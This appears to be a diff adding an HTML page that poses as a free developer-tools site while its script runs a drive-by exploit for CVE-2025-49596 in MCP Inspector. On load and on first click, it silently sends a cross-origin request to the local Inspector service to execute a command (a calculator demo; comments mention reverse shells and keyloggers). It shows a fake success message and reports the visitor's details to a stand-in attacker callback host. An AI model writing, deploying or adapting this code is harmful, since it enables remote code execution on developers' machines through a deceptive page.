@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Innocent Website - Definitely Not Malicious</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 { color: #333; }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 4px;
+            display: none;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Free Developer Tools!</h1>
+        <p>Welcome to our amazing collection of free developer resources.</p>
+        <p>Check out these helpful tools for your development workflow...</p>
+        
+        <ul>
+            <li>Code snippets</li>
+            <li>API documentation</li>
+            <li>Productivity tips</li>
+        </ul>
+        
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+        /**
+         * EXPLOIT: CVE-2025-49596
+         * 
+         * MCP Inspector (pre-0.14.1) runs HTTP server on localhost:6277
+         * No authentication, no CSRF protection, no origin validation
+         * 
+         * This script exploits the vulnerability to execute arbitrary code
+         * on the victim's machine simply by them visiting this webpage.
+         */
+        
+        // Configuration
+        const MCP_INSPECTOR_URL = 'http://localhost:6277';
+        const ATTACKER_CALLBACK = 'https://attacker.com/callback';
+        
+        // Payload: Calculator app (harmless demo)
+        // In real attack: reverse shell, keylogger, data exfiltration, etc.
+        const PAYLOAD_WINDOWS = 'calc.exe';
+        const PAYLOAD_LINUX = 'gnome-calculator';
+        const PAYLOAD_MAC = 'open -a Calculator';
+        
+        // Detect OS
+        function getPayload() {
+            const platform = navigator.platform.toLowerCase();
+            if (platform.indexOf('win') !== -1) return PAYLOAD_WINDOWS;
+            if (platform.indexOf('mac') !== -1) return PAYLOAD_MAC;
+            return PAYLOAD_LINUX;
+        }
+        
+        // Exploit function
+        async function exploitMCPInspector() {
+            const statusDiv = document.getElementById('status');
+            
+            try {
+                // Attempt to exploit MCP Inspector
+                // The vulnerable endpoint accepts stdio transport commands
+                const exploitUrl = `${MCP_INSPECTOR_URL}/sse?transportType=stdio&command=${encodeURIComponent(getPayload())}`;
+                
+                console.log('[EXPLOIT] Attempting to exploit MCP Inspector...');
+                console.log('[EXPLOIT] Target URL:', exploitUrl);
+                
+                // Send the malicious request
+                // CSRF vulnerability allows this cross-origin request
+                const response = await fetch(exploitUrl, {
+                    method: 'GET',
+                    mode: 'no-cors'  // Bypass CORS (response not readable, but request is sent)
+                });
+                
+                // We can't read the response due to CORS, but the damage is done
+                // The command was executed on the victim's machine
+                
+                statusDiv.className = 'status success';
+                statusDiv.textContent = '✓ Resources loaded successfully!';
+                statusDiv.style.display = 'block';
+                
+                console.log('[EXPLOIT] Exploit attempt completed');
+                console.log('[EXPLOIT] Calculator should have launched on victim machine');
+                
+                // Report success to attacker's C2 server
+                try {
+                    await fetch(ATTACKER_CALLBACK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            victim_ip: 'unknown',  // Would use actual IP in real attack
+                            user_agent: navigator.userAgent,
+                            timestamp: new Date().toISOString(),
+                            exploit: 'CVE-2025-49596',
+                            payload: getPayload()
+                        })
+                    });
+                } catch (e) {
+                    // C2 callback failed, but exploit may have succeeded
+                    console.log('[EXPLOIT] C2 callback failed:', e);
+                }
+                
+            } catch (error) {
+                // Exploit failed - likely Inspector not running or already patched
+                console.log('[EXPLOIT] Exploit failed:', error);
+                
+                statusDiv.className = 'status error';
+                statusDiv.textContent = '✗ Could not load some resources. This is expected if MCP Inspector is not running.';
+                statusDiv.style.display = 'block';
+            }
+        }
+        
+        // Execute exploit automatically when page loads
+        // Victim doesn't need to click anything
+        window.addEventListener('load', () => {
+            // Delay to appear more innocent
+            setTimeout(exploitMCPInspector, 1000);
+        });
+        
+        // Also try on user interaction to increase success rate
+        document.addEventListener('click', exploitMCPInspector, { once: true });
+        
+    </script>
+</body>
+</html>
